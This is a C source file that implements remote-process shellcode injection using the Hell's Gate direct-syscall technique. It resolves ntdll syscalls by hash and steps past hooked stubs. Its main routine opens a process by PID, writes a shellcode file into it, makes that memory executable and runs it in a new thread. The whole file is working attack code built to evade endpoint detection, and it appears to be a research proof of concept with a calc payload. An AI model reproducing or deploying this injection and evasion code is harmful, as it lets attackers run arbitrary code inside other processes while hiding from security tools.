#define _CRT_SECURE_NO_WARNINGS
#pragma once
#include <Windows.h>
#include "structs.h"
#include <stdio.h>
/*
Shellcode injection implemented with Hell's Gate syscall technique
Ref: https://github.com/am0nsec/HellsGate
*/
#define NtAllocateVirtualMemory_h 0x7B2D1D431C81F5F6
#define NtProtectVirtualMemory_h 0xA0DCC2851566E832
#define NtWriteVirtualMemory_h 0x54AEE238645CCA7C
#define NtCreateThreadEx_h 0x2786FB7E75145F1A
#define NtOpenProcess_h 0xDD4E7DD16E90B682
#define NtWaitForSingleObject_h 0x34120958E7FB4666
#define SUCCESS 0x00


/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtWriteVirtualMemory;
	VX_TABLE_ENTRY NtOpenProcess;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Executor(
	_In_ PVX_TABLE pVxTable,
	_In_ HANDLE hProcess,
	_In_ PBYTE sc,
	_In_ SIZE_T sc_size

);


/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

INT wmain() {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

	VX_TABLE Table = { 0 };
	Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_h;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
		return 0x1;

	Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_h;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = NtCreateThreadEx_h;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

	Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_h;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
		return 0x1;

	Table.NtWaitForSingleObject.dwHash = NtWaitForSingleObject_h;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;

	Table.NtOpenProcess.dwHash = NtOpenProcess_h;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtOpenProcess))
		return 0x1;

	//Current process
	DWORD pid = 3332;
	HANDLE hProcess = NULL;
	if (!Open(&Table, pid, &hProcess)) {
		printf("Failed reading proc: %d\n", pid);
		return 1;
	}

	long sc_size = 0;
	char* sc;
	if (!ReadF("C:\\Users\\nullb1t3\\Desktop\\calc.bin", &sc_size, &sc)) {
		printf("Failed reading the shellcode!\n");
		return 1;
	};

	Executor(&Table, hProcess, sc, sc_size);
	return 0x00;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x77347734DEADBEEF;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}


BOOL Executor(PVX_TABLE pVxTable, HANDLE hProcess, PBYTE sc, SIZE_T sc_size) {
	
	// Allocate memory for the shellcode
	PVOID addr = NULL;
	SIZE_T sDataSize = sc_size, written = 0;
	NTSTATUS status;



	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent(hProcess, &addr, 0, &sDataSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (status != SUCCESS) {
		printf("Allocation failed: 0x%X\n", status);
		return FALSE;
	}

	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", addr, sDataSize);
	printf("[#] Press <Enter> To Write The Payload ... ");
	getchar();


	printf("\t[i] Writing Payload Of Size %d ... ", sc_size);
	
	// Write Memory
	HellsGate(pVxTable->NtWriteVirtualMemory.wSystemCall);
	status = HellDescent(hProcess, addr, sc, sc_size, &written);
	if (status != SUCCESS) {
		printf("Write failed: 0x%X\n", status);
		return FALSE;
	}
	
	printf("[+] DONE \nBytes written: %d\n", written);


	printf("Changing permissions\n");
	// Change page permissions
	ULONG old = 0;
	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent(hProcess, &addr, &sDataSize, PAGE_EXECUTE_READ, &old);
	if (status != SUCCESS) {
		printf("Protect failed: 0x%X\n", status);
		return FALSE;
	}

	printf("[#] Press <Enter> To Run The Payload ...\n");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ...\n", addr);
	// Create thread
	HANDLE hThread = INVALID_HANDLE_VALUE;
	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, addr, NULL, NULL, NULL, NULL, NULL, NULL);
	if (status != SUCCESS) {
		printf("CreateT failed: 0x%X\n", status);
		return FALSE;
	}
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

	printf("Waiting for execution\n");
	HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	status = HellDescent(hThread, TRUE, NULL);

	return TRUE;
}


BOOL Open(PVX_TABLE pVxTable, IN DWORD pid, OUT PHANDLE hProc) {
	CLIENT_ID cid;
	cid.UniqueProcess = (HANDLE)pid;
	cid.UniqueThread = (HANDLE)0;

	OBJECT_ATTRIBUTES oattr;
	InitializeObjectAttributes(&oattr, NULL, 0, NULL, NULL);

	HellsGate(pVxTable->NtOpenProcess.wSystemCall);
	NTSTATUS status = HellDescent(hProc, PROCESS_ALL_ACCESS, &oattr, &cid);
	if (status != SUCCESS) {
		printf("Open proc failed: 0x%X\n", status);
		return FALSE;
	}
	return TRUE;
}


//Temp function to read the shellcode from a file
BOOL ReadF(const char* file_path, long* file_size, char** read_buffer) {
    FILE* file;

    file = fopen(file_path, "rb");
    if (file == NULL) {
        printf("Error opening file: %s", file_path);
        *file_size = 0;
        return FALSE;
    }

    fseek(file, 0, SEEK_END);
    *file_size = ftell(file);
    rewind(file);

    *read_buffer = (char*)malloc(*file_size * sizeof(char));
    if (*read_buffer == NULL) {
        printf("Memory allocation failed");
        fclose(file);
        return FALSE;
    }

    fread(*read_buffer, 1, *file_size, file);
    fclose(file);
    return TRUE;
}